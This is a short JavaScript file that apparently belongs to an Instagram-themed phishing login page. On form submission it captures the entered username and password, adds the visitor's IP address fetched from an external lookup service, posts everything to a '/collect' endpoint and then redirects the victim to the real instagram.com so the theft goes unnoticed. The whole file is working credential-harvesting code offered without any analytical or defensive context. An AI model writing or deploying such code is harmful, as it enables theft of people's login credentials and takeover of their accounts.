document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    // Get form data
    const formData = new FormData(this);
    const credentials = {
        username: formData.get('username'),
        password: formData.get('password')
    };
    
    // Get IP address using external API
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            credentials.ip = data.ip;
            
            // Send data to server
            fetch('/collect', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(credentials)
            })
            .then(response => {
                if (response.ok) {
                    window.location.href = 'https://instagram.com';
                }
            });
        });
});